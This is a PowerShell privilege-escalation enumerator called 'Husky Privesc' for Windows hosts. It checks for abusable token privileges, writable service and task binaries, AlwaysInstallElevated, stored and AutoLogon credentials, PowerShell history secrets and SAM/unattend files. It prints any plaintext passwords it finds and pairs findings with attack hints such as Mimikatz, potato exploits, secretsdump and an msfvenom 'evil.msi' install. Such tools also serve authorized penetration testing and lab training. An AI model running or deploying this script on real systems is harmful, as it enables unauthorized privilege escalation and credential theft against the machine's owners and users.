<#
.SYNOPSIS
    Husky Privesc - Windows Privilege Escalation Enumerator
.EXAMPLE
    powershell -ep bypass -f privesc.ps1
#>
$Host.UI.RawUI.WindowTitle = "Husky Privesc"
function Write-Banner { Write-Host ""; Write-Host "    HUSKY HACKER" -ForegroundColor Cyan; Write-Host "    P R I V E S C   E N U M E R A T O R" -ForegroundColor White; Write-Host "    Find the path. Take the crown." -ForegroundColor DarkGray; Write-Host "" }
function Write-Section($t) { Write-Host ""; Write-Host "  === $t ===" -ForegroundColor Cyan }
function Write-Crit($m,$d) { Write-Host "  [CRITICAL] $m" -ForegroundColor Red; if($d){Write-Host "    -> $d" -ForegroundColor DarkGray}; $script:crits++ }
function Write-High($m,$d) { Write-Host "  [HIGH] $m" -ForegroundColor Yellow; if($d){Write-Host "    -> $d" -ForegroundColor DarkGray}; $script:highs++ }
function Write-Med($m,$d) { Write-Host "  [MEDIUM] $m" -ForegroundColor Cyan; if($d){Write-Host "    -> $d" -ForegroundColor DarkGray}; $script:meds++ }
function Write-Info($m) { Write-Host "  [*] $m" -ForegroundColor DarkGray }
$script:crits = 0; $script:highs = 0; $script:meds = 0
Write-Banner
Write-Section "System Information"
try { $os = Get-CimInstance Win32_OperatingSystem; $cs = Get-CimInstance Win32_ComputerSystem; Write-Info "Hostname: $($env:COMPUTERNAME)"; Write-Info "OS: $($os.Caption) $($os.Version)"; Write-Info "Domain: $($cs.Domain)"; Write-Info "User: $($env:USERDOMAIN)\$($env:USERNAME)"; Write-Info "Arch: $($os.OSArchitecture)"; if($cs.PartOfDomain){Write-Info "DOMAIN JOINED to $($cs.Domain)"} } catch { Write-Info "Hostname: $($env:COMPUTERNAME)"; Write-Info "User: $($env:USERDOMAIN)\$($env:USERNAME)" }
Write-Section "Token Privileges"
$privs = whoami /priv 2>$null
if ($privs) {
    $dp = @{ "SeImpersonatePrivilege"="GodPotato/PrintSpoofer/JuicyPotato -> SYSTEM"; "SeAssignPrimaryTokenPrivilege"="Token manipulation -> SYSTEM"; "SeBackupPrivilege"="Backup SAM/SYSTEM -> offline hash extraction"; "SeRestorePrivilege"="Overwrite system files"; "SeTcbPrivilege"="TcbElevation.exe -> SYSTEM"; "SeDebugPrivilege"="Debug processes -> migrate into SYSTEM"; "SeLoadDriverPrivilege"="Load vulnerable kernel driver"; "SeTakeOwnershipPrivilege"="Take ownership of any object"; "SeCreateTokenPrivilege"="Create arbitrary tokens" }
    foreach ($p in $dp.Keys) {
        $m = $privs | Select-String -Pattern $p
        if ($m) {
            if ($m -match "Enabled") { Write-Crit "$p is ENABLED" $dp[$p] }
            else { Write-High "$p present (disabled)" $dp[$p] }
        }
    }
}
Write-Section "Group Membership"
$groups = whoami /groups 2>$null
$ig = @("BUILTIN\\Administrators","Backup Operators","Server Operators","Account Operators","DnsAdmins","Domain Admins","Remote Desktop Users","Remote Management Users")
foreach ($g in $ig) { if ($groups -match [regex]::Escape($g)) { Write-High "Member of: $g" } }
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) { Write-Crit "Running as LOCAL ADMINISTRATOR" "Grab hashes with Mimikatz" }
Write-Section "Service Misconfigurations"
Write-Info "Checking unquoted service paths..."
try {
    Get-CimInstance Win32_Service | Where-Object { $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -notmatch '^C:\\Windows\\' -and $_.PathName -match ' ' } | ForEach-Object { Write-High "Unquoted service path: $($_.Name)" "$($_.PathName)" }
} catch {}
Write-Info "Checking service binary permissions..."
try {
    Get-CimInstance Win32_Service | ForEach-Object {
        $path = $_.PathName
        if ($path) {
            $exePath = if ($path.StartsWith('"')) { ($path -split '"')[1] } else { ($path -split ' ')[0] }
            if ($exePath -and (Test-Path $exePath -ErrorAction SilentlyContinue)) {
                try {
                    $acl = Get-Acl $exePath -ErrorAction SilentlyContinue
                    $cu = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
                    foreach ($a in $acl.Access) {
                        $id = $a.IdentityReference.ToString()
                        if (($id -match "Everyone|Users|Authenticated Users") -or ($id -eq $cu)) {
                            $r = $a.FileSystemRights.ToString()
                            if ($r -match "Modify|FullControl|Write") { Write-Crit "Writable service binary: $($_.Name)" "Path: $exePath" }
                        }
                    }
                } catch {}
            }
        }
    }
} catch {}
Write-Section "Scheduled Tasks"
Write-Info "Checking writable task binaries..."
try {
    $tasks = schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
    foreach ($t in $tasks) {
        $act = $t."Task To Run"
        if ($act -and $act -ne "N/A" -and $act -notmatch "COM handler") {
            $tp = ($act -split ' ')[0].Trim('"')
            if ($tp -and (Test-Path $tp -ErrorAction SilentlyContinue)) {
                $ta = Get-Acl $tp -ErrorAction SilentlyContinue
                if ($ta) { foreach ($a in $ta.Access) { if ($a.IdentityReference.ToString() -match "Everyone|Users|Authenticated" -and $a.FileSystemRights.ToString() -match "Modify|FullControl|Write") { Write-High "Writable task binary: $($t.TaskName)" "Binary: $tp" } } }
            }
        }
    }
} catch {}
Write-Section "AlwaysInstallElevated"
$aie1 = $null; $aie2 = $null
try { $aie1 = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated } catch {}
try { $aie2 = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated } catch {}
if ($aie1 -eq 1 -and $aie2 -eq 1) { Write-Crit "AlwaysInstallElevated ENABLED!" "msfvenom -f msi > evil.msi && msiexec /quiet /qn /i evil.msi" } else { Write-Info "AlwaysInstallElevated: Not enabled" }
Write-Section "Stored Credentials"
$ck = cmdkey /list 2>$null
if ($ck -match "Target:") { Write-High "Stored credentials found" "runas /savecred /user:<user> cmd.exe"; $ck | Select-String "Target:" | ForEach-Object { Write-Info "  $_" } }
try { $au = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue).DefaultUserName; $ap = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue).DefaultPassword; if ($ap) { Write-Crit "AutoLogon password found!" "User: $au  Pass: $ap" } elseif ($au) { Write-Med "AutoLogon user: $au (no pass in registry)" } } catch {}
try { $dp2 = Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue; if ($dp2) { Write-Med "DPAPI credential files: $($dp2.Count) file(s)" "Mimikatz dpapi::cred" } } catch {}
Write-Section "PowerShell History"
$hp = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $hp) { $hs = (Get-Item $hp).Length; Write-High "PS history found: $hp ($hs bytes)"; try { Select-String -Path $hp -Pattern "pass|pwd|cred|secret|key|token" -ErrorAction SilentlyContinue | Select-Object -First 5 | ForEach-Object { Write-Info "  $($_.Line.Trim())" } } catch {} } else { Write-Info "No PowerShell history" }
Write-Section "Interesting Files"
@("C:\Windows\Repair\SAM","C:\Windows\Repair\SYSTEM","C:\Windows\System32\config\RegBack\SAM","C:\Windows\System32\config\RegBack\SYSTEM") | ForEach-Object { if (Test-Path $_ -ErrorAction SilentlyContinue) { Write-High "SAM/SYSTEM backup: $_" "secretsdump -sam SAM -system SYSTEM LOCAL" } }
@("C:\Unattend.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\System32\Sysprep\unattend.xml") | ForEach-Object { if (Test-Path $_ -ErrorAction SilentlyContinue) { Write-High "Unattend file: $_" "May contain plaintext creds" } }
Write-Info "Searching for password files..."
try { Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 1MB } | Select-Object -First 100 | Select-String -Pattern "password|passwd|pwd|credential" -ErrorAction SilentlyContinue | Select-Object -Unique Path -First 10 | ForEach-Object { Write-Med "Possible creds: $($_.Path)" } } catch {}
Write-Section "Network and Internal Services"
Write-Info "Listening ports:"
$lp = @{"3306"="MySQL";"5432"="PostgreSQL";"6379"="Redis";"27017"="MongoDB";"1433"="MSSQL";"8080"="HTTP-internal";"3000"="Dev-app";"9200"="Elasticsearch"}
netstat -ano 2>$null | Select-String "LISTENING" | ForEach-Object { $l = $_.ToString().Trim(); foreach ($port in $lp.Keys) { if ($l -match "127\.0\.0\.1:$port\s") { Write-Med "Internal $($lp[$port]) on 127.0.0.1:$port" } } }
Write-Section "Installed Software"
Write-Info "Non-default software:"
try { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "Microsoft|Windows|Update|Visual C|\.NET" } | Select-Object DisplayName,DisplayVersion -First 20 | ForEach-Object { Write-Info "  $($_.DisplayName) $($_.DisplayVersion)" } } catch {}
Write-Host ""; Write-Host "  =================================================" -ForegroundColor Red; Write-Host "  PRIVESC SUMMARY" -ForegroundColor White; Write-Host "  -------------------------------------------------" -ForegroundColor DarkGray
Write-Host -NoNewline "  CRITICAL: $script:crits  " -ForegroundColor Red; Write-Host -NoNewline "HIGH: $script:highs  " -ForegroundColor Yellow; Write-Host "MEDIUM: $script:meds" -ForegroundColor Cyan
Write-Host "  =================================================" -ForegroundColor Red; Write-Host ""
